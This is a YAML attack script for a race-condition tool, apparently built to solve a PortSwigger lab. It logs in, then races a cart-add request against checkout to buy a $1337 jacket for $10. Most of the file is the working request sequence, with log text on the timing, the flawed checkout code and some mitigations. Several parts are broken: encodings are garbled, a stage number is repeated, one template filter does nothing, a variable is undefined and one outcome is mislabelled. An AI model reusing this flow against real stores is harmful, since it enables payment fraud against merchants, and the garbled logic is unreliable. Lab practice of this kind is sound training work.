# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
# Multi-Endpoint Race Condition
# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
#
# PortSwigger Lab: Multi-endpoint race conditions
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint
#
# Exploits race window between adding item to cart and checkout validation.
# By racing POST /cart (add jacket) with POST /cart/checkout (buy gift card),
# we can purchase expensive jacket for gift card price.
#
# Setup:
#   export LAB_HOST="0a1b2c3d.web-security-academy.net"
#   treco attack.yaml
#
# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

metadata:
  name: "Multi-Endpoint Race Condition"
  version: "1.0"
  author: "Security Researcher"
  vulnerability: "CWE-367: Time-of-check Time-of-use (TOCTOU)"
  description: |
    Exploits race condition between cart modification and checkout validation.
    By sending POST /cart and POST /cart/checkout simultaneously, we can add
    an expensive item during the payment validation window, effectively
    purchasing it for the price of the item originally in cart.

target:
  host: "{{ env('LAB_HOST') }}"
  port: 443
  http:
    follow_redirects: false
  tls:
    enabled: true
    verify_cert: false
  proxy:
    type: http
    host: 127.0.0.1
    port: 8080

entrypoint:
  state: login
  input:
    username: "wiener"
    password: "peter"
    gift_card_id: "2"      # $10 gift card
    jacket_id: "1"         # $1337 Lightweight L33t Leather Jacket

states:
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 1: Login
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  login:
    description: "Authenticate as wiener"
    
    request: |
      GET /login HTTP/1.1
      Host: {{ target.host }}
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      Connection: close
    
    extract:
      csrf_token:
        type: xpath
        pattern: '//input[@name="csrf"]/@value'
      
      session:
        type: cookie
        pattern: session
    
    logger:
      on_state_leave: |
        ğŸ” Session: {{ login.session }}...
        ğŸ« CSRF: {{ login.csrf_token[:16] }}...
    
    next:
      - on_status: 200
        goto: do_login

  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 2: Submit Login
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  do_login:
    description: "Submit credentials"
    
    request: |
      POST /login HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ login.session }}
      Content-Type: application/x-www-form-urlencoded
      Connection: close
      
      csrf={{ login.csrf_token }}&username={{ username }}&password={{ password }}
    
    extract:
      session:
        type: cookie
        pattern: session
    
    logger:
      on_state_leave: |
        âœ… Logged in as {{ username }}
        ğŸ’° Ready to exploit cart race condition
    
    next:
      - on_status: [200, 302]
        goto: add_gift_card

  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 3: Add Gift Card to Cart (Setup)
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  add_gift_card:
    description: "Add $10 gift card to cart (bait item)"
    
    request: |
      POST /cart HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ do_login.session }}
      Content-Type: application/x-www-form-urlencoded
      Connection: close
      
      productId={{ gift_card_id }}&redir=PRODUCT&quantity=1
    
    logger:
      on_state_leave: |
        ğŸ Gift card added to cart ($10)
        ğŸ¯ Now racing: Add jacket + Checkout simultaneously
    
    next:
      - on_status: [200, 302]
        goto: get_cart_csrf


  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 4: Get Cart CSRF Token (Required for Checkout)
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  get_cart_csrf:
    description: "Extract CSRF token from cart page"
    
    request: |
      GET /cart HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ do_login.session }}
      Connection: close
    
    extract:
      csrf_checkout:
        type: xpath
        pattern: '//input[@name="csrf"]/@value'
    
    logger:
      on_state_leave: |
        ğŸ« Checkout CSRF: {{ get_cart_csrf.csrf_checkout[:16] }}...
        ğŸ¯ Ready to race: Add jacket + Checkout simultaneously
    
    next:
      - on_status: 200
        goto: race_multi_endpoint

  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 4: RACE ATTACK - Multi-Endpoint
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  race_multi_endpoint:
    description: "Race: Add jacket to cart while checking out"
    
    # Different requests per thread
    input:
      endpoint:
        - /cart
        - /cart/checkout
      body:
        - "productId={{ jacket_id }}&redir=PRODUCT&quantity=1"
        - "csrf={{ get_cart_csrf.csrf_checkout }}"
    
    race:
      threads: 2
      sync_mechanism: barrier
      connection_strategy: multiplexed
      thread_propagation: single
      input_mode: distribute
    
    request: |
      POST {{ thread.input.endpoint }} HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ do_login.session }}
      {% if thread.input.body -%}
      Content-Type: application/x-www-form-urlencoded
      {% endif %}
      Connection: close

      {{ thread.input.body | replace("XYZ", "productId={{ jacket_id }}&redir=PRODUCT&quantity=1") }}
    
    logger:
      on_thread_enter: |
        ğŸš€ [Thread {{ thread.id + 1 }}] {{ thread.input.method }} {{ thread.input.endpoint }}
      
      on_thread_leave: |
        {% if response.status_code in [200, 302] %}
        âœ… [Thread {{ thread.id + 1 }}] Success: {{ thread.input.endpoint }} ({{ timing_ms }}ms)
        {% else %}
        âŒ [Thread {{ thread.id + 1 }}] Failed: HTTP {{ response.status_code }}
        {% endif %}
      
      on_state_leave: |
        
        â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        ğŸ¯ Multi-Endpoint Race Complete!
        â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        
        ğŸ“Š Attack Flow:
           Thread 1: POST /cart (add $1337 jacket)
           Thread 2: POST /cart/checkout (process $10 gift card)
        
        ğŸ’¡ If successful:
           â€¢ Jacket added during payment validation window
           â€¢ Checkout processed with original $10 price
           â€¢ Purchased $1337 jacket for $10! ğŸ‰
        
        ğŸŒ Next Steps:
        
        1. Check if order was successful:
           Visit: https://{{ target.host }}/cart
        
        2. If jacket is in cart but not purchased:
           â†’ Run attack again (timing was off)
        
        3. If jacket was purchased:
           â†’ Lab solved! Check "My Account" â†’ "Order History"
        
        4. If insufficient funds error:
           â†’ Run attack multiple times until successful
        
        â±ï¸  Timing Analysis:
           â€¢ Both endpoints should complete within ~50ms window
           â€¢ POST /cart/checkout validates cart state BEFORE locking
           â€¢ POST /cart modifies cart DURING validation
           â€¢ Result: TOCTOU vulnerability! âš¡
    
    next:
      - on_status: [200, 302]
        goto: verify_purchase

  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 5: Verify Purchase
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  verify_purchase:
    description: "Check if jacket was purchased"
    
    request: |
      GET /cart HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ do_login.session }}
      Connection: close
    
    logger:
      on_state_leave: |
        
        â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        âœ… Attack Complete
        â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        
        ğŸ” Verification:
        
        {% if "Lightweight l33t Leather Jacket" in response.text %}
        ğŸ‰ SUCCESS! Jacket still in cart (not yet purchased)
           â†’ Remove from cart and try again
        {% else %}
        âœ… EXPLOITED! Cart is empty - jacket was purchased!
           â†’ Check "My Account" for order confirmation
           â†’ Lab should be solved! ğŸ†
        {% endif %}
        
        ğŸ“Š Why This Works:
        
        Attack Timeline:
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚ T=0ms:   Both threads hit barrier                              â”‚
        â”‚ T=1ms:   POST /cart/checkout starts validation                 â”‚
        â”‚          â”œâ”€ Reads cart: [gift_card]                            â”‚
        â”‚          â”œâ”€ Validates price: $10 âœ“                             â”‚
        â”‚          â””â”€ [RACE WINDOW OPEN] âš¡                               â”‚
        â”‚ T=2ms:   POST /cart adds jacket to cart                        â”‚
        â”‚          â””â”€ Cart now: [gift_card, jacket]                      â”‚
        â”‚ T=3ms:   POST /cart/checkout completes                         â”‚
        â”‚          â””â”€ Processes with OLD cart state ($10) âœ“              â”‚
        â”‚ Result:  Purchased jacket + gift card for $10! ğŸ¯              â”‚
        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        
        Vulnerable Code Pattern:
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚ def checkout():                                                â”‚
        â”‚     cart = get_cart(session)      # â† Read cart state         â”‚
        â”‚     price = calculate_price(cart) # â† Calculate from snapshot â”‚
        â”‚     # [RACE WINDOW] âš¡                                          â”‚
        â”‚     validate_payment(price)       # â† Check affordability     â”‚
        â”‚     # cart might be modified here!                             â”‚
        â”‚     finalize_order(cart)          # â† Process current cart    â”‚
        â”‚                                                                â”‚
        â”‚ # Missing: Lock cart during checkout!                          â”‚
        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        
        ğŸ’¡ Mitigation:
           â€¢ Lock cart when checkout begins
           â€¢ Re-validate cart state before finalizing
           â€¢ Use database transactions with proper isolation
           â€¢ Atomic read-modify-write operations
        
        ğŸ† If lab is not solved, run attack again (timing sensitivity ~50ms)